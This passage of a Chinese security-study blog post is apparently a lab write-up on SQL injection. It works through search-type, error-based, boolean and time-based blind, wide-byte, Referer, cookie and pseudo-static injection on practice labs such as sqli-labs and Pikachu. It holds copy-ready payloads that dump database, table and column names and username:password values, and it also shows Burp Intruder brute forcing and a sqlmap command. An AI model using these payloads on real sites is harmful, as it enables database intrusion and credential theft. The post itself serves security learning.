+<p>其中又分为POST&#x2F;GET,GET型的一般是用在网站上的搜索,而POST则用在用户名的登录,可以从form表单的method&#x3D;”get”属性来区分是get还是post。搜索型注入又称为文本框注入。</p>
+<p>2）原理</p>
+<blockquote>
+<p><strong>$sql&#x3D;”select * from user where password like ‘%$pwd%’ order by password”;</strong><br>“%”匹配任何字符，“like”的意思就是像。<br>这句SQL的语句就是基于用户输入的pwd在users表中找到相应的password，正常用户当然会输入例如admin,ckse等等。<br>但是当有人输入这样的内容的时候：**’and 1&#x3D;1 and ‘%’&#x3D;’**</p>
+<p>这样的话这句SQL语句就变成这样：</p>
+<p><strong>select * from user where password like ‘%fendo’ and 1&#x3D;1 and ‘%’&#x3D;’%’ order by password</strong></p>
+<p>可判断存在SQL注入</p>
+</blockquote>
+<p><strong>实验（Pikachu）：</strong></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/20.png"></p>
+<blockquote>
+<p>先输入单引号 ’ ，报错</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘%’’ at  line 1</p>
+<p>一个单引号没有闭合，报错</p>
+<p>接着输入 <strong>‘and 1&#x3D;1 and ‘%’&#x3D;’</strong>(或者 <strong>‘ and 1&#x3D;1#</strong>)</p>
+<img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/21.png" alt="image-20210722164029906" style="zoom:80%;">
+</blockquote>
+<p>获取数据库信息同整型注入语法</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="基于错误型盲注"><a href="#基于错误型盲注" class="headerlink" title="基于错误型盲注"></a>基于错误型盲注</h5><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p>
+<p><strong>XPath语法：</strong></p>
+<p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。</p>
+<p><code>extractvalue():从目标XML中返回包含所查询值的字符串</code></p>
+<blockquote>
+<p>EXTRACTVALUE （XML_document,XPath_string);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称</p>
+<p>第二个参数：XPath_string(XPath格式的字符串)<code>要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</code></p>
+<p>concat:返回结果为连接参数产生的字符串。</p>
+<p>payload:<code>id=&#39; and (select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p>
+<p>针对数据库：</p>
+<p>查询数据库名：<code>id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select database()))))</code>;</p>
+<p>爆表：<code>id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</code>;</p>
+<p>爆字段：<code>id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;...&#39;))))</code>;</p>
+<p>爆值：<code>id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select group_concat(concat_ws(&#39;:&#39;,username,password))from &quot;COLUMN_NAME&quot;))))</code>;</p>
+</blockquote>
+<p><code>updatexml():更新XML</code></p>
+<blockquote>
+<p>UPDATEXML（XML_document,XPath_string,new_value）;</p>
+<p>第一个参数：xml_document是string格式，为xml文档对象的名称 </p>
+<p>第二个参数：xpath_string是xpath格式的字符串</p>
+<p>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p>
+<p>payload:<code>id=&#39;and (select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句)),&quot;anything&quot;))</code></p>
+<p>针对数据库：</p>
+<p>查询数据库名：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select database())),‘~’))</code>;</p>
+<p>爆表：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database())),&#39;~&#39;))</code>;</p>
+<p>爆字段：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select column_name from informtion_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;)),&#39;~&#39;))</code>;</p>
+<p>爆值：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(concat_ws(&#39;:&#39;,username,password))from &quot;COLUMN_NAME&quot;))))</code></p>
+</blockquote>
+<p><strong>实验（sqli-labs&#x2F;less11)：</strong></p>
+<p>用Burp suite抓包</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/22.png"></p>
+<p>发送到Repeater,用extractvalue()来报错：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/23.png"></p>
+<p><strong>concat+rand()+group_by()导致主键重复</strong></p>
+<p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错group by key的原理是循环读取数据的每一行，将解雇保存于临时表。</p>
+<p><code>rand():生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</code></p>
+<p><code>floor()：对任意正或者负的十进制值向下取整</code></p>
+<p>通常用这两个函数的方法是floor(rand(0))*2,其会生成0和1两个数</p>
+<p><code>group by是根据一个或多个列对结果集进行分组的sql语句</code></p>
+<p>常见的payload:</p>
+<p><code>&#39;union select 1 from (select count(*),concat((select语句),floor(rand(0)*2))x from &quot;一个足够大的表&quot; group by x)a#</code></p>
+<blockquote>
+<p>针对数据库</p>
+<p>爆数据库名：<code>&#39; union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a#</code></p>
+<p>爆表：<code>&#39; union select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database()limit 0,1),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a#</code></p>
+<p>爆字段：<code>&#39; union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot; limit 0,1),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a#</code></p>
+<p>*** 不能使用group_concat()函数，所以用limit语句来限制查询结果的列数</p>
+</blockquote>
+<h5 id="基于布尔型盲注"><a href="#基于布尔型盲注" class="headerlink" title="基于布尔型盲注"></a>基于布尔型盲注</h5><p>布尔盲注：True与Fales，它只会根据你的注入信息返回True跟False，没有之前的报错信息。</p>
+<p>常用函数：</p>
+<blockquote>
+<p>length()函数：返回字符串的长度</p>
+<p>substr()：截取字符串（语法：substr(str,pos,len);）pos–位置，len–长度</p>
+<p>left():夹逼法（语法：left(str,pos);)   pos–位置</p>
+<p>ascii()：返回字符的ascii码，将字符变成数字</p>
+</blockquote>
+<p>因为盲注不能直接用database()函数得到数据库名，先要判断数据库名的长度为多少；</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/24.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/25.png"></p>
+<p>由上面两个页面显示可以推测数据库名的长度为8.</p>
+<p><strong>一、下面来猜测这些字符串(都需要慢慢试试）</strong>：</p>
+<p>方法一：</p>
+<blockquote>
+<p>夹逼法：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/26.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/27.png"></p>
+<p>由此可推测数据库名第一个字符为“s”;</p>
+</blockquote>
+<p>方法二：</p>
+<blockquote>
+<p>直接用substr()函数将每个字符带入验证（比较麻烦）</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/28.png"></p>
+<p>不断测试，得到 ‘s’ 为第一个字符；</p>
+</blockquote>
+<p>方法三：(转化为数字型夹逼法)</p>
+<blockquote>
+<p>用ascii()函数和substr()函数</p>
+<p>payload: <code>and ascii(substr(database(),1,1))&gt;106</code></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/29.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/30.png"></p>
+</blockquote>
+<p>一个一个试出数据库名</p>
+<p>方法四：</p>
+<blockquote>
+<p>用ascii()函数和substr()函数、Burp suite抓包,<strong>一个一个字符爆破</strong></p>
+<p>将抓到的包发送到Intruder模块（爆破模块）</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/31.png"></p>
+<p>得到下图：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/32.png"></p>
+<p>设置暴力破解类型</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/58.png"></p>
+<p>start attack</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/33.png"></p>
+<p>依次爆破后面的字符</p>
+</blockquote>
+<p>方法五：</p>
+<blockquote>
+<p>用ascii()函数和substr()函数、Burp suite抓包，两变量一起爆破</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/34.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/35.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/36.png"></p>
+<p>爆破结果：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/37.png"></p>
+</blockquote>
+<p><strong>二、猜表名</strong></p>
+<p>先猜表名的字段数</p>
+<p>下面再猜字符</p>
+<p><code>payload: and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;106</code></p>
+<blockquote>
+<p>方法同上面的猜数据库名，就是select 语句有所改变</p>
+</blockquote>
+<p><strong>三、猜表的字段</strong></p>
+<p><code>payload: and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=‘loflag’ limit 0,1),1,1))&gt;1</code></p>
+<blockquote>
+<p>方法同上，select语句改变</p>
+</blockquote>
+<h5 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h5><p>时间型的注入遇到的条件更为苛刻，数据交互完成以后目标网站<strong>没有错误和正确的页面回显</strong>，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。</p>
+<p>常用函数：</p>
+<blockquote>
+<p>sleep(seconds)：将程序挂起一段时间为n秒</p>
+<p>if(expr1,expr2,expr3)：判断语句，如果第一个语句正确，就执行第二个语句；如果错误执行，就执行第三个语句</p>
+</blockquote>
+<p><strong>实验（sqli-labs&#x2F;less-9):</strong></p>
+<blockquote>
+<p>一、枚举当前数据库名：</p>
+<p>获取数据库名的长度</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/38.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/40.png"></p>
+<p>依次获取每个字符</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/41.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/42.png"></p>
+<p>依次枚举后面的字符，可得数据库名为”security”</p>
+<p>二、猜表名</p>
+<p><code>payload: and if (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;100,1,sleep(5)) %23</code></p>
+<p>此时立即回显；</p>
+<p><code>payload: and if (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,1,sleep(5)) %23</code></p>
+<p>此时缓冲5秒后回显</p>
+<p>即表名为‘email’</p>
+<p>三、猜表里的字段</p>
+<p><code>payload:and if (ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;email&#39; limit 0,1),1,1))&gt;104,1,sleep(5)) %23</code></p>
+<p>此时立即回显</p>
+<p><code>payload:and if (ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;email&#39; limit 0,1),1,1))&gt;105,1,sleep(5)) %23</code></p>
+<p>此时缓冲5秒后回显</p>
+<p>字段为‘id’</p>
+</blockquote>
+<h4 id="特殊注入"><a href="#特殊注入" class="headerlink" title="特殊注入"></a>特殊注入</h4><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>在mysql中，用于转义（即在字符串中的符号前加上“&#x2F;“）的函数有addslashes,mysql_real_escape_string,mysql_escape_string等</p>
+<p>宽字节：GB2312、GBK、GB18030、BIG5、Shift——JIS等是常见的宽字节，实际上只有两个字节。</p>
+<p>宽字符带来的安全问题主要是吃ASCII字符（一字节）的现象，将两个ascii字符误认为是一个宽字节字符</p>
+<p><strong>宽字节注入原理</strong></p>
+<p>１.字符型的注入点通过单引号来判断，当遇上addslashes()时，单引号会被转义成<code>\&#39;</code>,导致判断注入点失效，我们用来判断注入点的单引号失效。</p>
+<p>2.URL编码</p>
+<p><code>空格:  %20</code></p>
+<p><code>&#39; :   %27</code></p>
+<p><code># :   %23</code> </p>
+<p><code>\ :   %5C</code></p>
+<p>3.<code>payload: %df &#39;</code>,原理是当MYSQL在使用GBK编码的时候，会认为两个字符是一个繁体汉字，让单引号%27成功逃逸：</p>
+<p> <code>’  —&gt;  \&#39; —&gt;  %5C%27</code>   </p>
+<p><code>%df &#39;  —&gt;  %df\&#39;  —&gt; %df%5C%27</code></p>
+<p><strong>实验（pikachu)：</strong></p>
+<blockquote>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/43.png"></p>
+<p>为POST型注入，用burp suite抓包</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/44.png"></p>
+<p>可显字段</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/45.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/46.png"></p>
+<p>由上面的两个图可以知道，字段为2</p>
+<p>获取数据库名</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/47.png"></p>
+<p>下面同上面，只需改变select语句</p>
+</blockquote>
+<h5 id="HTTP-Referer注入"><a href="#HTTP-Referer注入" class="headerlink" title="HTTP-Referer注入"></a>HTTP-Referer注入</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guizimo/p/13710243.html">Referer的含义解释</a></p>
+<blockquote>
+<p>实验（sqli-labs&#x2F;less-19)：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/48.png"></p>
+<p><code>insert语句：insert into xxx(列名，列名，列名) values (&#39;&#39;,&#39;&#39;)</code>        xxx为表名</p>
+<p>根据insert设计成功回显<code>insert into xxx(列名，列名，列名) values (&#39;&#39; and &#39;&#39;,&#39;&#39;)</code>就不报错了</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/49.png"></p>
+<p>加入报错语句extractvalue(),获取数据库信息</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/50.png"></p>
+<p>或者是</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/51.png"></p>
+<p>将1换成报错语句updatexml(),获取数据库信息</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/52.png"></p>
+</blockquote>
+<h5 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h5><p>Cookie注入简单来说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p>
+<p><strong>cookie注入原理</strong>：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。</p>
+<blockquote>
+<p>实验（CTFHub-cookie注入）：</p>
+<p>方法一：</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/53.png" alt="53"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/54.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/55.png"></p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/56.png"></p>
+<p>方法二（自动化注入）：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/php09/p/10404560.html">sqlmap的使用</a></p>
+</blockquote>
+<h5 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h5><p>含义：“伪静态”顾名思义就是一种表面上看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互的网站，具有这种特性的网页成为“伪静态网页”。我们看到的伪静态网页其实是经过处理的，将动态网页的id等参数通过URL重写来隐藏，让查看者以为是静态网页。</p>
+<p>如果看到一个以.html或者.htm结尾的网页，此时可以通过在地址输入框中输入：<code>javascript:alert(document.lastModified)</code>，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。<br>网上的一个伪静态网站</p>
+<p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/57.png"></p>
+<p>用sqlmap自动化注入攻击</p>
+<p><code>sqlmap -u http://xxx.xx.xx.xx:xx/test.php/id/1.html   --database()</code></p>
+<p>其余获取数据库信息只需换一下后面的语句</p>
+<h5 id="Base64变形注入"><a href="#Base64变形注入" class="headerlink" title="Base64变形注入"></a>Base64变形注入</h5><p>将order by 等等语句进行base64加密，再进行注入</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/">web基础---SQL注入</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2021-08-14, 20:28:34</p>
+        <p><span>最后更新:</span>2022-08-12, 20:08:48</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/" title="web基础---SQL注入">https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/09/18/Web%E6%B8%97%E9%80%8F/">
+                    web渗透---信息收集方式
+                </a>
+            </div>
+        
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80%E2%80%94SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">web基础—SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What"><span class="toc-number">1.1.</span> <span class="toc-text">What</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Why"><span class="toc-number">1.2.</span> <span class="toc-text">Why</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Classify"><span class="toc-number">1.5.</span> <span class="toc-text">Classify</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#GET%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%B8%8EPOST%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">GET型注入与POST型注入的区别：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.1.</span> <span class="toc-text">回显型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">基于整型注入：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">基于字符型注入：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">基于搜索型注入：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">基于错误型盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">基于布尔型盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">基于时间盲注</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.</span> <span class="toc-text">特殊注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP-Referer%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">HTTP-Referer注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">伪静态注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64%E5%8F%98%E5%BD%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.5.</span> <span class="toc-text">Base64变形注入</span></a></li></ol></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"web基础---SQL注入　| KrismileBlog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://krismile-ni.github.com/2021/08/14/SQL%E6%B3%A8%E5%85%A5/';
+            this.page.identifier = '2021/08/14/SQL注入/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/09/18/Web%E6%B8%97%E9%80%8F/" title="上一篇: web渗透---信息收集方式">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/">Vulnhub渗透测试--AI-web1.0</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/">2022网刃杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/17/RCE/">RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/natas/">Natas</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">web基础---XSS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/">JWT基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/">PHP反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">web基础---MD5（）函数的漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/18/Web%E6%B8%97%E9%80%8F/">web渗透---信息收集方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/">web基础---SQL注入</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021-2022 krismile
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
